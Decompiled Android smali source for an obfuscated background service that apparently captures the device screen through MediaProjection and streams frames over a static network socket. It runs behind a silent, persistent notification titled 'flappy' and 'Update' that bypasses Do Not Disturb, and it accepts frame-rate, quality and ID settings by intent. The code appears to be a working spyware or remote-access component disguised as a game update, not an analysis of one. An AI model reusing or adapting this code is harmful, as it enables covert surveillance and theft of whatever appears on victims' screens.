.class public Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;
.super Landroid/app/Service;
.source "suagrfmwoweetpowrzstychkg2.java"


# static fields
.field static final ACTION_RECORD:Ljava/lang/String; = "ginom.alfa.lib.scan.RECORD"

.field static final ACTION_SHUTDOWN:Ljava/lang/String; = "ginom.alfa.lib.scan.SHUTDOWN"

.field private static final CHANNEL_WHATEVER:Ljava/lang/String; = "Scaning"

.field static final EXTRA_RESULT_CODE:Ljava/lang/String; = "resultCode"

.field static final EXTRA_RESULT_INTENT:Ljava/lang/String; = "resultIntent"

.field public static FPS:I = 0x0

.field public static ISON:Z = false

.field public static Lo:Z = false

.field private static final NOTIFY_ID:I = 0x26b2

.field public static PID:Ljava/lang/String; = null

.field public static Q:I = 0x0

.field static final VIRT_DISPLAY_FLAGS:I = 0x9

.field public static appContext:Landroid/content/Context;

.field public static ctd:Z

.field public static out:Ljava/io/OutputStream;

.field private static projection:Landroid/media/projection/MediaProjection;

.field public static sk:Ljava/net/Socket;

.field public static syc:Ljava/lang/Object;

.field public static usd:Z

.field private static vdisplay:Landroid/hardware/display/VirtualDisplay;


# instance fields
.field _IDD:I

.field public bts:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field private handler:Landroid/os/Handler;

.field private final handlerThread:Landroid/os/HandlerThread;

.field private it:Lginom/alfa/lib/scan/ktbjgzktazalgmgtfswtiyeai8;

.field private mgr:Landroid/media/projection/MediaProjectionManager;

.field mynotify:Landroid/app/Notification;

.field private resultCode:I

.field private resultData:Landroid/content/Intent;

.field private wmgr:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 286
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->syc:Ljava/lang/Object;

    const/4 v0, 0x0

    .line 287
    sput-boolean v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->ISON:Z

    .line 288
    sput-boolean v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->usd:Z

    sput-boolean v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->ctd:Z

    sput-boolean v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->Lo:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .line 41
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 58
    new-instance v0, Landroid/os/HandlerThread;

    .line 59
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0xa

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    iput-object v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->handlerThread:Landroid/os/HandlerThread;

    const/16 v0, 0x11a7

    .line 196
    iput v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->_IDD:I

    .line 285
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->bts:Ljava/util/List;

    return-void
.end method

.method static synthetic access$000(Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;)V
    .locals 0

    .line 41
    invoke-direct {p0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->startCapture()V

    return-void
.end method

.method static synthetic access$100(Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;)V
    .locals 0

    .line 41
    invoke-direct {p0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->di()V

    return-void
.end method

.method static synthetic access$200()Landroid/media/projection/MediaProjection;
    .locals 1

    .line 41
    sget-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->projection:Landroid/media/projection/MediaProjection;

    return-object v0
.end method

.method static synthetic access$202(Landroid/media/projection/MediaProjection;)Landroid/media/projection/MediaProjection;
    .locals 0

    .line 41
    sput-object p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->projection:Landroid/media/projection/MediaProjection;

    return-object p0
.end method

.method static synthetic access$300(Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;)I
    .locals 0

    .line 41
    iget p0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->resultCode:I

    return p0
.end method

.method static synthetic access$400(Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;)Landroid/content/Intent;
    .locals 0

    .line 41
    iget-object p0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->resultData:Landroid/content/Intent;

    return-object p0
.end method

.method static synthetic access$500(Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;)Landroid/media/projection/MediaProjectionManager;
    .locals 0

    .line 41
    iget-object p0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->mgr:Landroid/media/projection/MediaProjectionManager;

    return-object p0
.end method

.method static synthetic access$600(Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;)Lginom/alfa/lib/scan/ktbjgzktazalgmgtfswtiyeai8;
    .locals 0

    .line 41
    iget-object p0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->it:Lginom/alfa/lib/scan/ktbjgzktazalgmgtfswtiyeai8;

    return-object p0
.end method

.method static synthetic access$602(Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;Lginom/alfa/lib/scan/ktbjgzktazalgmgtfswtiyeai8;)Lginom/alfa/lib/scan/ktbjgzktazalgmgtfswtiyeai8;
    .locals 0

    .line 41
    iput-object p1, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->it:Lginom/alfa/lib/scan/ktbjgzktazalgmgtfswtiyeai8;

    return-object p1
.end method

.method static synthetic access$700()Landroid/hardware/display/VirtualDisplay;
    .locals 1

    .line 41
    sget-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    return-object v0
.end method

.method static synthetic access$702(Landroid/hardware/display/VirtualDisplay;)Landroid/hardware/display/VirtualDisplay;
    .locals 0

    .line 41
    sput-object p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    return-object p0
.end method

.method private di()V
    .locals 1

    const/4 v0, 0x0

    .line 483
    sput-boolean v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->Lo:Z

    .line 484
    :try_start_0
    sget-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownOutput()V
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 485
    :catch_0
    :try_start_1
    sget-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownInput()V
    :try_end_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 486
    :catch_1
    :try_start_2
    sget-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/net/SocketException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 487
    :catch_2
    :try_start_3
    sget-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/net/SocketException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_3

    .line 488
    :catch_3
    :try_start_4
    sget-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/net/SocketException; {:try_start_4 .. :try_end_4} :catch_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_0

    :catch_4
    nop

    .line 489
    :goto_0
    sget-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->out:Ljava/io/OutputStream;

    if-eqz v0, :cond_0

    :try_start_5
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_5
    .catch Ljava/net/SocketException; {:try_start_5 .. :try_end_5} :catch_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_5

    :catch_5
    const/4 v0, 0x0

    sput-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->out:Ljava/io/OutputStream;

    :cond_0
    return-void
.end method

.method public static myforground(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Landroid/app/Notification;
    .locals 10

    const/4 v0, 0x0

    if-nez p0, :cond_0

    return-object v0

    :cond_0
    const-string v1, "notification"

    .line 80
    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    .line 81
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    const v4, 0x106000d

    const-string v5, "Update"

    const-string v6, "flappy"

    const/4 v7, 0x2

    const/4 v8, 0x0

    const/4 v9, 0x1

    if-lt v2, v3, :cond_1

    .line 84
    new-instance v2, Landroid/app/NotificationChannel;

    invoke-direct {v2, p1, p2, v7}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 88
    invoke-virtual {v2, v9}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    .line 89
    invoke-virtual {v2, v8}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    .line 91
    invoke-virtual {v2, v0, v0}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    .line 92
    invoke-virtual {v2, v9}, Landroid/app/NotificationChannel;->setBypassDnd(Z)V

    .line 93
    invoke-virtual {v2, v8}, Landroid/app/NotificationChannel;->enableVibration(Z)V

    .line 96
    .line 98
    new-instance p2, Landroid/app/Notification$Builder;

    invoke-direct {p2, p0, p1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 99
    invoke-virtual {p2, v6}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 100
    invoke-virtual {p0, v5}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 101
    invoke-virtual {p0, v9}, Landroid/app/Notification$Builder;->setVisibility(I)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 102
    invoke-virtual {p0, v4}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 103
    invoke-virtual {p0, v9}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 105
    invoke-virtual {p0, v8}, Landroid/app/Notification$Builder;->setAutoCancel(Z)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 106
    invoke-virtual {p0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object p0

    return-object p0

    .line 179
    :cond_1
    new-instance p1, Landroid/app/Notification$Builder;

    invoke-direct {p1, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    .line 180
    invoke-virtual {p1, v6}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 181
    invoke-virtual {p0, v5}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 182
    invoke-virtual {p0, v4}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 183
    invoke-virtual {p0, v7}, Landroid/app/Notification$Builder;->setPriority(I)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 184
    invoke-virtual {p0, v9}, Landroid/app/Notification$Builder;->setVisibility(I)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 185
    invoke-virtual {p0, v9}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 186
    invoke-virtual {p0, v0}, Landroid/app/Notification$Builder;->setSound(Landroid/net/Uri;)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 187
    invoke-virtual {p0, v8}, Landroid/app/Notification$Builder;->setAutoCancel(Z)Landroid/app/Notification$Builder;

    move-result-object p0

    .line 188
    invoke-virtual {p0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object p0

    return-object p0
.end method

.method private startCapture()V
    .locals 2

    .line 533
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 534
    new-instance v1, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2$4;

    invoke-direct {v1, p0, p0, v0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2$4;-><init>(Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;Landroid/os/Handler;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method public static stopCapture()V
    .locals 1

    .line 524
    sget-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->projection:Landroid/media/projection/MediaProjection;

    if-eqz v0, :cond_0

    .line 525
    invoke-virtual {v0}, Landroid/media/projection/MediaProjection;->stop()V

    .line 526
    sget-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    invoke-virtual {v0}, Landroid/hardware/display/VirtualDisplay;->release()V

    const/4 v0, 0x0

    .line 527
    sput-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->projection:Landroid/media/projection/MediaProjection;

    :cond_0
    return-void
.end method


# virtual methods
.method public FindNewIcon()V
    .locals 2

    .line 341
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2$2;

    invoke-direct {v1, p0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2$2;-><init>(Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 479
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method getHandler()Landroid/os/Handler;
    .locals 1

    .line 497
    iget-object v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->handler:Landroid/os/Handler;

    return-object v0
.end method

.method getWindowManager()Landroid/view/WindowManager;
    .locals 1

    .line 493
    iget-object v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->wmgr:Landroid/view/WindowManager;

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .line 282
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string v0, "Binding not supported."

    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .locals 3

    .line 199
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 202
    :try_start_0
    sget-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->appContext:Landroid/content/Context;

    if-nez v0, :cond_0

    .line 204
    invoke-virtual {p0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->appContext:Landroid/content/Context;

    .line 206
    :cond_0
    iget-object v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->mynotify:Landroid/app/Notification;

    if-nez v0, :cond_1

    .line 208
    invoke-virtual {p0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "NotificationSystem"

    const-string v2, "Work"

    invoke-static {v0, v1, v2}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->myforground(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Landroid/app/Notification;

    move-result-object v0

    iput-object v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->mynotify:Landroid/app/Notification;

    .line 210
    :cond_1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1d

    if-lt v0, v1, :cond_2

    .line 211
    iget v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->_IDD:I

    iget-object v1, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->mynotify:Landroid/app/Notification;

    const/16 v2, 0x20

    invoke-virtual {p0, v0, v1, v2}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->startForeground(ILandroid/app/Notification;I)V

    goto :goto_0

    .line 214
    :cond_2
    iget v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->_IDD:I

    iget-object v1, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->mynotify:Landroid/app/Notification;

    invoke-virtual {p0, v0, v1}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :goto_0
    const-string v0, "media_projection"

    .line 217
    invoke-virtual {p0, v0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iput-object v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->mgr:Landroid/media/projection/MediaProjectionManager;

    const-string v0, "window"

    .line 218
    invoke-virtual {p0, v0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->wmgr:Landroid/view/WindowManager;

    .line 220
    iget-object v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    .line 221
    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->handler:Landroid/os/Handler;

    return-void
.end method

.method public onDestroy()V
    .locals 0

    .line 274
    invoke-static {}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->stopCapture()V

    .line 276
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    .line 229
    sget-object p2, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->appContext:Landroid/content/Context;

    if-nez p2, :cond_0

    .line 231
    invoke-virtual {p0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    sput-object p2, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->appContext:Landroid/content/Context;

    .line 233
    :cond_0
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    const-string p3, "ginom.alfa.lib.scan.RECORD"

    if-nez p2, :cond_1

    const/16 p2, 0x539

    const-string v0, "resultCode"

    .line 234
    invoke-virtual {p1, v0, p2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    iput p2, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->resultCode:I

    const-string p2, "resultIntent"

    .line 235
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p2

    check-cast p2, Landroid/content/Intent;

    iput-object p2, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->resultData:Landroid/content/Intent;

    const/16 p2, 0xa

    const-string v0, "Q"

    .line 236
    invoke-virtual {p1, v0, p2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->Q:I

    const/4 p2, 0x5

    const-string v0, "F"

    .line 237
    invoke-virtual {p1, v0, p2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->FPS:I

    const-string p2, "P"

    .line 238
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->PID:Ljava/lang/String;

    .line 239
    new-instance p1, Landroid/content/Intent;

    const-class p2, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;

    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 241
    invoke-virtual {p1, p3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    .line 242
    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 244
    :cond_1
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p3, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_3

    .line 245
    iget-object p1, p0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->resultData:Landroid/content/Intent;

    if-eqz p1, :cond_2

    .line 248
    invoke-virtual {p0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->FindNewIcon()V

    goto :goto_0

    .line 251
    :cond_2
    new-instance p1, Landroid/content/Intent;

    const-class p2, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;

    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 p2, 0x10000000

    .line 253
    invoke-virtual {p1, p2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 255
    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 258
    :cond_3
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    const-string p2, "ginom.alfa.lib.scan.SHUTDOWN"

    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    const/4 p1, 0x0

    .line 260
    sput-boolean p1, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->ISON:Z

    .line 261
    invoke-static {}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->stopCapture()V

    const/4 p1, 0x1

    .line 262
    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->stopForeground(Z)V

    .line 263
    invoke-virtual {p0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;->stopSelf()V

    :cond_4
    :goto_0
    const/4 p1, 0x2

    return p1
.end method

.method public pr()V
    .locals 2

    .line 292
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2$1;

    invoke-direct {v1, p0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2$1;-><init>(Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 338
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method processImage([B)V
    .locals 1

    .line 501
    new-instance v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2$3;

    invoke-direct {v0, p0, p1}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2$3;-><init>(Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;[B)V

    .line 519
    invoke-virtual {v0}, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2$3;->start()V

    return-void
.end method
